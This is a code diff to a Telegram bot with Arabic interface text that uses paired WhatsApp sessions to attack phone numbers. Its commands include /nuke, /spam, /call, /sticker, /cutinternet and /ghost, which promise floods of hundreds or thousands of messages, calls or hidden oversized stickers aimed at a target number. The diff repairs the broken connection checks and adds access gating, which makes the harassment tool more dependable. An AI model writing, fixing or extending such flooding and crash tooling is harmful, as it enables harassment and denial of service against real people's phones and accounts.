@@ -945,7 +945,7 @@ bot.command("nuke", async (ctx) => {
     const target = args[1]?.replace(/[^0-9]/g, "");
     if (!target || target.length < 10) return ctx.reply("⚠️ صيغة خاطئة:\n<code>/nuke 628xxxxxxxx</code>\n\n💥 هجوم نووي - يرسل 50 رسالة متتالية للهدف");
 
-    if (!waClients[userId]?.status === "open") return ctx.reply("📵 واتساب غير متصل! استخدم /reqpair");
+    if (waClients[userId]?.status !== "open") return ctx.reply("📵 واتساب غير متصل! استخدم /reqpair");
 
     const X = `${target}@s.whatsapp.net`;
     const imageMenu = getBotImageUrl();
@@ -967,16 +967,17 @@ bot.command("nuke", async (ctx) => {
 // =====================================================================
 
 bot.command("shield", async (ctx) => {
+  if (!checkWAConnection(ctx)) return;
   try {
     const userId = ctx.from.id.toString();
+    if (!hasAccess(userId)) return ctx.reply(getNoAccessMessage());
     const args = ctx.message.text.split(" ");
     const target = args[1]?.replace(/[^0-9]/g, "");
 
     if (!target || target.length < 10) return ctx.reply("⚠️ صيغة خاطئة:\n<code>/shield 628xxxxxxxx</code>\n\n🛡️ درع حماية - يحمي رقمك من الهجمات");
 
-    const X = `${target}@s.whatsapp.net`;
-    const client = waClients[userId]?.sock;
-    if (!client || client.readyState !== "OPEN") return ctx.reply("📵 واتساب غير متصل!");
+    if (waClients[userId]?.status !== "open") return ctx.reply("📵 واتساب غير متصل! استخدم /reqpair");
+    const client = waClients[userId].sock;
 
     // Send protective messages
     for (let i = 0; i < 5; i++) {
@@ -1008,7 +1009,7 @@ bot.command("stealth", async (ctx) => {
     const target = args[1]?.replace(/[^0-9]/g, "");
     if (!target || target.length < 10) return ctx.reply("⚠️ صيغة خاطئة:\n<code>/stealth 628xxxxxxxx</code>\n\n👻 وضع التسلل - إرسال رسائل غير مكتشفة");
 
-    if (!waClients[userId]?.status === "open") return ctx.reply("📵 واتساب غير متصل!");
+    if (waClients[userId]?.status !== "open") return ctx.reply("📵 واتساب غير متصل!");
 
     const X = `${target}@s.whatsapp.net`;
     await attackGhost(waClients[userId].sock, X);
@@ -1031,7 +1032,7 @@ bot.command("spam", async (ctx) => {
     const args = ctx.message.text.split(" ");
     const target = args[1]?.replace(/[^0-9]/g, "");
     if (!target || target.length < 10) return ctx.reply("⚠️ صيغة خاطئة:\n<code>/spam 628xxxxxxxx</code>\n💬 إرسال 1000 رسالة للهدف");
-    if (!waClients[userId]?.status === "open") return ctx.reply("📵 واتساب غير متصل!");
+    if (waClients[userId]?.status !== "open") return ctx.reply("📵 واتساب غير متصل!");
 
     const X = `${target}@s.whatsapp.net`;
     const imageMenu = getBotImageUrl();
@@ -1056,7 +1057,7 @@ bot.command("call", async (ctx) => {
     const args = ctx.message.text.split(" ");
     const target = args[1]?.replace(/[^0-9]/g, "");
     if (!target || target.length < 10) return ctx.reply("⚠️ صيغة خاطئة:\n<code>/call 628xxxxxxxx</code>\n📞 قرصنة صوتية - إرسال 200 مكالمة");
-    if (!waClients[userId]?.status === "open") return ctx.reply("📵 واتساب غير متصل!");
+    if (waClients[userId]?.status !== "open") return ctx.reply("📵 واتساب غير متصل!");
 
     const X = `${target}@s.whatsapp.net`;
     await ctx.reply(`📞 <b>قرصنة صوتية جارية...</b>\n🎯 ${target}`, { parse_mode: "HTML" });
@@ -1080,7 +1081,7 @@ bot.command("media", async (ctx) => {
     const args = ctx.message.text.split(" ");
     const target = args[1]?.replace(/[^0-9]/g, "");
     if (!target || target.length < 10) return ctx.reply("⚠️ صيغة خاطئة:\n<code>/media 628xxxxxxxx</code>\n🖼️ إرسال 500 ستكر كبير");
-    if (!waClients[userId]?.status === "open") return ctx.reply("📵 واتساب غير متصل!");
+    if (waClients[userId]?.status !== "open") return ctx.reply("📵 واتساب غير متصل!");
 
     const X = `${target}@s.whatsapp.net`;
     await ctx.reply(`🖼️ <b>فيضان ستكرات جاري...</b>\n🎯 ${target}`, { parse_mode: "HTML" });
@@ -1131,7 +1132,7 @@ bot.command("sticker", async (ctx) => {
     const args = ctx.message.text.split(" ");
     const target = args[1]?.replace(/[^0-9]/g, "");
     if (!target || target.length < 10) return ctx.reply("⚠️ صيغة خاطئة:\n<code>/sticker 628xxxxxxxx</code>\n📸 إرسال 1000 ستكر مخفي ضخم");
-    if (!waClients[userId]?.status === "open") return ctx.reply("📵 واتساب غير متصل!");
+    if (waClients[userId]?.status !== "open") return ctx.reply("📵 واتساب غير متصل!");
 
     const X = `${target}@s.whatsapp.net`;
     await ctx.reply(`📸 <b>ستكرات مخفية جارية...</b>\n🎯 ${target} - ستكرات ضخمة غير مرئية`, { parse_mode: "HTML" });
@@ -1155,7 +1156,7 @@ bot.command("cutinternet", async (ctx) => {
     const args = ctx.message.text.split(" ");
     const target = args[1]?.replace(/[^0-9]/g, "");
     if (!target || target.length < 10) return ctx.reply("⚠️ صيغة خاطئة:\n<code>/cutinternet 628xxxxxxxx</code>\n🔌 قطع الإنترنت عن الهدف");
-    if (!waClients[userId]?.status === "open") return ctx.reply("📵 واتساب غير متصل!");
+    if (waClients[userId]?.status !== "open") return ctx.reply("📵 واتساب غير متصل!");
 
     const X = `${target}@s.whatsapp.net`;
     await ctx.reply(`🔌 <b>قطع الإنترنت جاري...</b>\n🎯 ${target}`, { parse_mode: "HTML" });
@@ -1179,7 +1180,7 @@ bot.command("invisisendx", async (ctx) => {
     const args = ctx.message.text.split(" ");
     const target = args[1]?.replace(/[^0-9]/g, "");
     if (!target || target.length < 10) return ctx.reply("⚠️ صيغة خاطئة:\n<code>/invisisendx 628xxxxxxxx</code>\n🔒 إرسال 1000 رسالة غير مرئية");
-    if (!waClients[userId]?.status === "open") return ctx.reply("📵 واتساب غير متصل!");
+    if (waClients[userId]?.status !== "open") return ctx.reply("📵 واتساب غير متصل!");
 
     const X = `${target}@s.whatsapp.net`;
     await ctx.reply(`🔒 <b>رسائل غير مرئية جارية...</b>\n🎯 ${target}\n⏳ انتظر...`, { parse_mode: "HTML" });
@@ -1203,7 +1204,7 @@ bot.command("ghost", async (ctx) => {
     const args = ctx.message.text.split(" ");
     const target = args[1]?.replace(/[^0-9]/g, "");
     if (!target || target.length < 10) return ctx.reply("⚠️ صيغة خاطئة:\n<code>/ghost 628xxxxxxxx</code>\n👻 هجوم خفي - 500 رسالة مخفية");
-    if (!waClients[userId]?.status === "open") return ctx.reply("📵 واتساب غير متصل!");
+    if (waClients[userId]?.status !== "open") return ctx.reply("📵 واتساب غير متصل!");
 
     const X = `${target}@s.whatsapp.net`;
     await ctx.reply(`👻 <b>هجوم خفي جاري...</b>\n🎯 ${target}`, { parse_mode: "HTML" });
